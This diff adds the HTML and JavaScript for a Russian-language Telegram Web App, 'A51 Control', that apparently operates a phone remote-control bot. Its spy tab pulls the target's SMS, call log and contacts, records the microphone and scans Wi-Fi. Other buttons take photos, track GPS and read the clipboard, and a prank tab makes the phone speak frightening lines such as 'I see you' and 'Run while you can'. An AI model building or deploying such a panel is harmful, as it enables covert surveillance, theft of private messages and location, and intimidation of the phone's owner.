@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>A51 Control</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>
+:root {
+  --bg: #0a0a0a;
+  --card: #171717;
+  --accent: #ff5500;
+  --text: #fff;
+  --muted: #8a8a8a;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: -apple-system, 'SF Pro', system-ui, sans-serif;
+  min-height: 100vh;
+  padding-bottom: 40px;
+}
+.header {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 14px 16px 10px;
+  position: sticky; top: 0;
+  background: var(--bg);
+  z-index: 10;
+}
+.logo { font-size: 20px; font-weight: 800; letter-spacing: -0.5px; }
+.logo span { color: var(--accent); }
+.status { display: flex; align-items: center; gap: 6px; font-size: 12px; color: var(--muted); }
+.dot {
+  width: 8px; height: 8px; border-radius: 50%;
+  background: #2ecc71; box-shadow: 0 0 8px #2ecc71;
+  animation: pulse 2s infinite;
+}
+@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
+
+.tabs {
+  display: flex; gap: 6px;
+  padding: 0 16px 14px;
+  overflow-x: auto; scrollbar-width: none;
+}
+.tabs::-webkit-scrollbar { display: none; }
+.tab {
+  flex: 0 0 auto;
+  padding: 9px 18px;
+  border-radius: 22px;
+  background: var(--card);
+  color: var(--muted);
+  font-size: 13px; font-weight: 600;
+  border: none; cursor: pointer;
+  transition: all 0.2s;
+}
+.tab.active { background: var(--accent); color: #fff; }
+
+.content { padding: 0 16px; }
+.page { display: none; animation: fadeIn 0.25s ease; }
+.page.active { display: block; }
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(6px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.section-title {
+  font-size: 11px; font-weight: 700;
+  letter-spacing: 1.2px; text-transform: uppercase;
+  color: var(--muted); margin: 18px 0 10px;
+}
+.section-title:first-child { margin-top: 0; }
+
+.grid { display: grid; gap: 10px; }
+.g2 { grid-template-columns: 1fr 1fr; }
+.g3 { grid-template-columns: 1fr 1fr 1fr; }
+
+button.action {
+  background: var(--card);
+  color: var(--text);
+  border: none; border-radius: 16px;
+  padding: 16px 10px;
+  font-size: 13px; font-weight: 600;
+  display: flex; flex-direction: column; align-items: center; gap: 6px;
+  cursor: pointer;
+  transition: transform 0.1s, background 0.2s;
+  min-height: 84px;
+  justify-content: center;
+}
+button.action:active { transform: scale(0.95); background: var(--accent); }
+button.action.danger { color: #ff6b6b; }
+button.action.danger:active { background: #ff6b6b; color: #fff; }
+button.action.success { color: #2ecc71; }
+button.action.success:active { background: #2ecc71; color: #fff; }
+button.action.warn { color: #f39c12; }
+button.action.warn:active { background: #f39c12; color: #fff; }
+.icon { font-size: 26px; line-height: 1; }
+.label { font-size: 12px; }
+
+button.action.primary {
+  background: linear-gradient(135deg, var(--accent), #1e88e5);
+  color: #fff;
+  grid-column: span 2;
+  min-height: 60px;
+  flex-direction: row;
+  gap: 10px;
+}
+button.action.primary .icon { font-size: 22px; }
+button.action.primary .label { font-size: 15px; }
+
+.input-block { display: flex; gap: 8px; margin-bottom: 10px; }
+.input-block input {
+  flex: 1; padding: 12px 14px;
+  border-radius: 12px; border: 1px solid #222;
+  background: var(--card); color: var(--text);
+  font-size: 14px; outline: none;
+}
+.input-block input::placeholder { color: #555; }
+.input-block button {
+  padding: 12px 20px; border-radius: 12px;
+  background: var(--accent); color: #fff;
+  border: none; font-weight: 600;
+  cursor: pointer; font-size: 16px;
+}
+.input-block button:active { opacity: 0.8; }
+
+.toast {
+  position: fixed; bottom: 30px; left: 50%;
+  transform: translateX(-50%) translateY(100px);
+  background: rgba(0,0,0,0.9);
+  backdrop-filter: blur(10px);
+  color: #fff; padding: 12px 22px;
+  border-radius: 30px;
+  font-size: 14px; font-weight: 600;
+  z-index: 1000; opacity: 0;
+  transition: all 0.3s ease;
+  pointer-events: none;
+  white-space: nowrap;
+  max-width: 90vw; overflow: hidden; text-overflow: ellipsis;
+}
+.toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
+.toast.ok { background: rgba(46, 204, 113, 0.95); }
+.toast.err { background: rgba(231, 76, 60, 0.95); }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="logo">A51 <span>Control</span></div>
+  <div class="status"><span class="dot"></span>online</div>
+</div>
+
+<div class="tabs">
+  <button class="tab active" onclick="switchTab('system', this)">⚙️ Система</button>
+  <button class="tab" onclick="switchTab('spy', this)">🕵️ Шпион</button>
+  <button class="tab" onclick="switchTab('prank', this)">🎭 Пранк</button>
+  <button class="tab" onclick="switchTab('music', this)">🎵 Музыка</button>
+</div>
+
+<div class="content">
+
+  <!-- SYSTEM -->
+  <div class="page active" id="system">
+    <div class="section-title">Свет и связь</div>
+    <div class="grid g3">
+      <button class="action" onclick="send('/torch on')"><span class="icon">🔦</span><span class="label">Фонарь</span></button>
+      <button class="action" onclick="send('/torch off')"><span class="icon">🌑</span><span class="label">Выкл</span></button>
+      <button class="action" onclick="send('/vibrate 3')"><span class="icon">📳</span><span class="label">Вибро</span></button>
+    </div>
+
+    <div class="section-title">Камера и локация</div>
+    <div class="grid g3">
+      <button class="action" onclick="send('/photo')"><span class="icon">📸</span><span class="label">Фото</span></button>
+      <button class="action" onclick="send('/selfie')"><span class="icon">🤳</span><span class="label">Селфи</span></button>
+      <button class="action" onclick="send('/location')"><span class="icon">📍</span><span class="label">GPS</span></button>
+    </div>
+
+    <div class="section-title">Инфо и управление</div>
+    <div class="grid g3">
+      <button class="action" onclick="send('/battery')"><span class="icon">🔋</span><span class="label">Батарея</span></button>
+      <button class="action" onclick="send('/device')"><span class="icon">📱</span><span class="label">Инфо</span></button>
+      <button class="action" onclick="send('/clip')"><span class="icon">📋</span><span class="label">Буфер</span></button>
+      <button class="action" onclick="send('/brightness 100')"><span class="icon">💡</span><span class="label">Свет+</span></button>
+      <button class="action" onclick="send('/brightness 10')"><span class="icon">🌙</span><span class="label">Свет−</span></button>
+      <button class="action" onclick="send('/silent')"><span class="icon">🔇</span><span class="label">Без звука</span></button>
+    </div>
+
+    <div class="section-title">Голос</div>
+    <div class="grid g3">
+      <button class="action" onclick="send('/say Привет!')"><span class="icon">👋</span><span class="label">Привет</span></button>
+      <button class="action" onclick="send('/say Я вижу тебя')"><span class="icon">👁</span><span class="label">Вижу</span></button>
+      <button class="action" onclick="send('/say Помогите!')"><span class="icon">🆘</span><span class="label">SOS</span></button>
+    </div>
+
+    <div class="section-title">Своя команда</div>
+    <div class="input-block">
+      <input id="customCmd" placeholder="/say текст или /notify ..." />
+      <button onclick="sendCustom()">📤</button>
+    </div>
+  </div>
+
+  <!-- SPY -->
+  <div class="page" id="spy">
+    <div class="section-title">Данные</div>
+    <div class="grid g3">
+      <button class="action" onclick="send('/sms')"><span class="icon">📩</span><span class="label">SMS</span></button>
+      <button class="action" onclick="send('/calls')"><span class="icon">📞</span><span class="label">Звонки</span></button>
+      <button class="action" onclick="send('/contacts')"><span class="icon">👥</span><span class="label">Контакты</span></button>
+    </div>
+
+    <div class="section-title">Запись и сеть</div>
+    <div class="grid g3">
+      <button class="action" onclick="send('/record 10')"><span class="icon">🎤</span><span class="label">Запись 10с</span></button>
+      <button class="action" onclick="send('/record 30')"><span class="icon">🎙</span><span class="label">Запись 30с</span></button>
+      <button class="action" onclick="send('/wifi')"><span class="icon">📶</span><span class="label">WiFi</span></button>
+      <button class="action" onclick="send('/wifiscan')"><span class="icon">📡</span><span class="label">Скан сетей</span></button>
+    </div>
+
+    <div class="section-title">Показать на экране</div>
+    <div class="input-block">
+      <input id="toastText" placeholder="Текст всплывашки" />
+      <button onclick="sendInput('/toast ', 'toastText')">🎈</button>
+    </div>
+    <div class="input-block">
+      <input id="notifyText" placeholder="Текст уведомления" />
+      <button onclick="sendInput('/notify ', 'notifyText')">🔔</button>
+    </div>
+
+    <div class="section-title">Открыть ссылку</div>
+    <div class="grid g2">
+      <button class="action" onclick="send('/open https://youtube.com')"><span class="icon">▶️</span><span class="label">YouTube</span></button>
+      <button class="action" onclick="send('/open https://google.com')"><span class="icon">🌐</span><span class="label">Google</span></button>
+    </div>
+  </div>
+
+  <!-- PRANK -->
+  <div class="page" id="prank">
+    <div class="section-title">Мощные пранки</div>
+    <button class="action warn" style="margin-bottom:10px;" onclick="send('/prank')">
+      <span class="icon">🎭</span><span class="label">Prank — случайный хаос (вибра + звук + фонарь)</span>
+    </button>
+    <button class="action warn" style="margin-bottom:10px;" onclick="send('/ghost')">
+      <span class="icon">👻</span><span class="label">Ghost — режим призрака</span>
+    </button>
+    <button class="action warn" style="margin-bottom:10px;" onclick="send('/insane')">
+      <span class="icon">🤪</span><span class="label">Insane — режим безумия</span>
+    </button>
+
+    <div class="section-title">Голосовые приколы</div>
+    <div class="grid g2">
+      <button class="action" onclick="send('/say Я твой телефон. Я живой.')"><span class="icon">🤖</span><span class="label">Я живой</span></button>
+      <button class="action" onclick="send('/say Ха-ха-ха-ха!')"><span class="icon">😈</span><span class="label">Смех</span></button>
+      <button class="action" onclick="send('/say Беги, пока можешь.')"><span class="icon">🏃</span><span class="label">Беги</span></button>
+      <button class="action" onclick="send('/say Помогите, меня похитили!')"><span class="icon">😱</span><span class="label">SOS</span></button>
+    </div>
+
+    <div class="section-title">Быстрые эффекты</div>
+    <div class="grid g3">
+      <button class="action" onclick="send('/torch on'); setTimeout(()=>send('/torch off'), 300)"><span class="icon">⚡</span><span class="label">Миг</span></button>
+      <button class="action" onclick="send('/vibrate 10')"><span class="icon">📳</span><span class="label">Вибро 10с</span></button>
+      <button class="action" onclick="send('/say Я тебя вижу.')"><span class="icon">👁</span><span class="label">Вижу</span></button>
+    </div>
+
+    <div class="section-title">Своя команда</div>
+    <div class="input-block">
+      <input id="prankCmd" placeholder="/say текст или /toast ..." />
+      <button onclick="sendInput('', 'prankCmd')">📤</button>
+    </div>
+  </div>
+
+  <!-- MUSIC -->
+  <div class="page" id="music">
+    <div class="section-title">Управление музыкой</div>
+    <div class="grid g3">
+      <button class="action" onclick="send('/list')"><span class="icon">📋</span><span class="label">Список</span></button>
+      <button class="action" onclick="send('/stop')"><span class="icon">⏹</span><span class="label">Стоп</span></button>
+      <button class="action" onclick="send('/volume 50')"><span class="icon">🔊</span><span class="label">50%</span></button>
+      <button class="action" onclick="send('/volume 20')"><span class="icon">🔉</span><span class="label">20%</span></button>
+      <button class="action" onclick="send('/volume 80')"><span class="icon">🔊</span><span class="label">80%</span></button>
+      <button class="action" onclick="send('/volume 100')"><span class="icon">🔊</span><span class="label">100%</span></button>
+    </div>
+
+    <div class="section-title">Играть трек</div>
+    <div class="input-block">
+      <input id="playName" placeholder="имя_трека.mp3" />
+      <button onclick="sendInput('/play ', 'playName')">▶️</button>
+    </div>
+  </div>
+
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+const tg = window.Telegram.WebApp;
+tg.ready();
+tg.expand();
+try {
+  tg.setHeaderColor('#0a0a0a');
+  tg.setBackgroundColor('#0a0a0a');
+} catch(e) {}
+
+let lastSent = 0;
+
+function switchTab(name, el) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  el.classList.add('active');
+  document.getElementById(name).classList.add('active');
+  try { tg.HapticFeedback.selectionChanged(); } catch(e) {}
+}
+
+function showToast(text, cls) {
+  const t = document.getElementById('toast');
+  t.textContent = text;
+  t.className = 'toast show' + (cls ? ' ' + cls : '');
+  setTimeout(() => t.classList.remove('show'), 1500);
+}
+
+function send(command) {
+  const now = Date.now();
+  if (now - lastSent < 300) return;
+  lastSent = now;
+  try { tg.HapticFeedback.impactOccurred('medium'); } catch(e) {}
+  showToast('→ ' + command, 'ok');
+  try {
+    tg.sendData(command);
+  } catch(e) {
+    showToast('❌ ' + e.message, 'err');
+  }
+}
+
+function sendCustom() {
+  const val = document.getElementById('customCmd').value.trim();
+  if (!val) return;
+  send(val);
+  document.getElementById('customCmd').value = '';
+}
+
+function sendInput(prefix, inputId) {
+  const val = document.getElementById(inputId).value.trim();
+  if (!val) return;
+  send(prefix + val);
+  document.getElementById(inputId).value = '';
+}
+
+document.addEventListener('keydown', e => {
+  if (e.key !== 'Enter') return;
+  const id = e.target.id;
+  if (id === 'customCmd') sendCustom();
+  else if (id === 'toastText') sendInput('/toast ', 'toastText');
+  else if (id === 'notifyText') sendInput('/notify ', 'notifyText');
+  else if (id === 'prankCmd') sendInput('', 'prankCmd');
+  else if (id === 'playName') sendInput('/play ', 'playName');
+});
+</script>
+
+</body>
+  </html>
